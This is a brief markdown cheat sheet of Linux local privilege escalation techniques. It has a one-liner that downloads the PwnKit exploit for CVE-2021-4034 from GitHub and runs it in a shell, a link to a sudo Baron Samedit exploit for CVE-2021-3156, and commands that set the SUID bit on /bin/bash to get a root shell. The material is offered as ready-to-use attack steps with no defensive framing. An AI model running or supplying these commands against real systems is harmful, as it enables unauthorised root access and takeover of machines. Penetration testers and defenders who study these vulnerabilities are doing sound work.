# Linux
Some local privilege escalation techniques.

## CVE-2021-4034 : Polkit privilege escalation exploit
Many PoCs on internet. This one can be used easily, downloading it on Internet : 
```bash
sh -c "$(curl -fsSL https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit.sh)"
```
More information on : https://github.com/ly4k/PwnKit

## CVE-2021-3156 : Sudo Baron Samedit exploit
```markdown
https://github.com/redhawkeye/sudo-exploit
```
Adding SUID to bash if you can control a binary/script launched by root :
```bash
chmod +s /bin/bash
/bin/bash -p
```
